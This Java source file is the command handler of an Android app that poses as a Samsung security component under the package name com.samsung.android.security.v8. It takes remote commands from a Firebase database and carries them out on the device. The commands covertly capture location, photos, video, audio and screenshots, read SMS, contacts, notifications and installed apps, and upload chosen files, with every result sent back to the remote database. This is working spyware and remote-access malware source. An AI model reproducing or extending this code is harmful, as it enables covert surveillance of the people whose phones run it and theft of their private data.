package com.samsung.android.security.v8.core;

import android.content.Context;
import android.location.Location;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.FirebaseDatabase;
import com.samsung.android.security.v8.utils.CameraUtil;
import com.samsung.android.security.v8.utils.ContactsUtil;
import com.samsung.android.security.v8.utils.FilesUtil;
import com.samsung.android.security.v8.utils.LocationUtil;
import com.samsung.android.security.v8.utils.NotificationUtil;
import com.samsung.android.security.v8.utils.ScreenshotUtil;
import com.samsung.android.security.v8.utils.SmsUtil;
import com.samsung.android.security.v8.utils.AudioUtil;
import com.samsung.android.security.v8.utils.AppsUtil;

import java.util.HashMap;
import java.util.Map;

public class CommandExecutor {
    
    private final Context context;
    private final String deviceId;
    private final String commandId;
    
    public CommandExecutor(Context context, String deviceId, String commandId) {
        this.context = context;
        this.deviceId = deviceId;
        this.commandId = commandId;
    }
    
    public void execute(String commandType, DataSnapshot commandData) {
        try {
            switch (commandType) {
                case "get_location":
                    getLocation();
                    break;
                    
                case "take_photo":
                    String camera = commandData.child("camera").getValue(String.class);
                    takePhoto(camera != null ? camera : "back");
                    break;
                    
                case "start_video":
                    String videoCamera = commandData.child("camera").getValue(String.class);
                    startVideo(videoCamera != null ? videoCamera : "back");
                    break;
                    
                case "stop_video":
                    stopVideo();
                    break;
                    
                case "record_audio":
                    Integer duration = commandData.child("duration").getValue(Integer.class);
                    recordAudio(duration != null ? duration : 30);
                    break;
                    
                case "take_screenshot":
                    takeScreenshot();
                    break;
                    
                case "get_sms":
                    getSms();
                    break;
                    
                case "get_contacts":
                    getContacts();
                    break;
                    
                case "get_notifications":
                    getNotifications();
                    break;
                    
                case "list_files":
                    String path = commandData.child("path").getValue(String.class);
                    listFiles(path != null ? path : "/");
                    break;
                    
                case "download_file":
                    String filePath = commandData.child("path").getValue(String.class);
                    downloadFile(filePath);
                    break;
                    
                case "get_apps":
                    getInstalledApps();
                    break;
                    
                default:
                    markFailed("Unknown command type: " + commandType);
                    break;
            }
        } catch (Exception e) {
            markFailed(e.getMessage());
        }
    }
    
    private void getLocation() {
        LocationUtil.getCurrentLocation(context, new LocationUtil.LocationCallback() {
            @Override
            public void onLocationReceived(Location location) {
                Map<String, Object> result = new HashMap<>();
                result.put("latitude", location.getLatitude());
                result.put("longitude", location.getLongitude());
                result.put("accuracy", location.getAccuracy());
                result.put("timestamp", System.currentTimeMillis());
                
                markCompleted(result);
            }
            
            @Override
            public void onError(String error) {
                markFailed(error);
            }
        });
    }
    
    private void takePhoto(String camera) {
        CameraUtil.takePhoto(context, camera, new CameraUtil.CameraCallback() {
            @Override
            public void onPhotoTaken(String url) {
                Map<String, Object> result = new HashMap<>();
                result.put("url", url);
                result.put("camera", camera);
                result.put("timestamp", System.currentTimeMillis());
                
                markCompleted(result);
            }
            
            @Override
            public void onError(String error) {
                markFailed(error);
            }
        });
    }
    
    private void startVideo(String camera) {
        CameraUtil.startVideo(context, camera, new CameraUtil.CameraCallback() {
            @Override
            public void onPhotoTaken(String url) {
                Map<String, Object> result = new HashMap<>();
                result.put("url", url);
                result.put("camera", camera);
                result.put("status", "recording");
                result.put("timestamp", System.currentTimeMillis());
                
                markCompleted(result);
            }
            
            @Override
            public void onError(String error) {
                markFailed(error);
            }
        });
    }
    
    private void stopVideo() {
        CameraUtil.stopVideo(new CameraUtil.CameraCallback() {
            @Override
            public void onPhotoTaken(String url) {
                Map<String, Object> result = new HashMap<>();
                result.put("url", url);
                result.put("status", "stopped");
                result.put("timestamp", System.currentTimeMillis());
                
                markCompleted(result);
            }
            
            @Override
            public void onError(String error) {
                markFailed(error);
            }
        });
    }
    
    private void recordAudio(int duration) {
        AudioUtil.recordAudio(context, duration, new AudioUtil.AudioCallback() {
            @Override
            public void onRecordingComplete(String url) {
                Map<String, Object> result = new HashMap<>();
                result.put("url", url);
                result.put("duration", duration);
                result.put("timestamp", System.currentTimeMillis());
                
                markCompleted(result);
            }
            
            @Override
            public void onError(String error) {
                markFailed(error);
            }
        });
    }
    
    private void takeScreenshot() {
        ScreenshotUtil.takeScreenshot(context, new ScreenshotUtil.ScreenshotCallback() {
            @Override
            public void onScreenshotTaken(String url) {
                Map<String, Object> result = new HashMap<>();
                result.put("url", url);
                result.put("timestamp", System.currentTimeMillis());
                
                markCompleted(result);
            }
            
            @Override
            public void onError(String error) {
                markFailed(error);
            }
        });
    }
    
    private void getSms() {
        try {
            Map<String, Object> result = SmsUtil.getAllSms(context);
            markCompleted(result);
        } catch (Exception e) {
            markFailed(e.getMessage());
        }
    }
    
    private void getContacts() {
        try {
            Map<String, Object> result = ContactsUtil.getAllContacts(context);
            markCompleted(result);
        } catch (Exception e) {
            markFailed(e.getMessage());
        }
    }
    
    private void getNotifications() {
        try {
            Map<String, Object> result = NotificationUtil.getRecentNotifications();
            markCompleted(result);
        } catch (Exception e) {
            markFailed(e.getMessage());
        }
    }
    
    private void listFiles(String path) {
        FilesUtil.listFiles(path, new FilesUtil.FilesCallback() {
            @Override
            public void onFilesListed(Map<String, Object> result) {
                markCompleted(result);
            }
            
            @Override
            public void onError(String error) {
                markFailed(error);
            }
        });
    }
    
    private void downloadFile(String filePath) {
        FilesUtil.uploadFile(context, filePath, new FilesUtil.UploadCallback() {
            @Override
            public void onUploadComplete(String url) {
                Map<String, Object> result = new HashMap<>();
                result.put("url", url);
                result.put("path", filePath);
                result.put("timestamp", System.currentTimeMillis());
                
                markCompleted(result);
            }
            
            @Override
            public void onError(String error) {
                markFailed(error);
            }
        });
    }
    
    private void getInstalledApps() {
        try {
            Map<String, Object> result = AppsUtil.getInstalledApps(context);
            markCompleted(result);
        } catch (Exception e) {
            markFailed(e.getMessage());
        }
    }
    
    private void markCompleted(Map<String, Object> result) {
        try {
            FirebaseDatabase.getInstance()
                    .getReference("devices")
                    .child(deviceId)
                    .child("commands")
                    .child(commandId)
                    .child("result")
                    .setValue(result);
            
            FirebaseDatabase.getInstance()
                    .getReference("devices")
                    .child(deviceId)
                    .child("commands")
                    .child(commandId)
                    .child("status")
                    .setValue("completed");
                    
            FirebaseDatabase.getInstance()
                    .getReference("devices")
                    .child(deviceId)
                    .child("commands")
                    .child(commandId)
                    .child("completedAt")
                    .setValue(System.currentTimeMillis());
        } catch (Exception e) {
            // Ignore
        }
    }
    
    private void markFailed(String error) {
        try {
            FirebaseDatabase.getInstance()
                    .getReference("devices")
                    .child(deviceId)
                    .child("commands")
                    .child(commandId)
                    .child("status")
                    .setValue("failed");
                    
            FirebaseDatabase.getInstance()
                    .getReference("devices")
                    .child(deviceId)
                    .child("commands")
                    .child(commandId)
                    .child("error")
                    .setValue(error);
        } catch (Exception e) {
            // Ignore
        }
    }
}
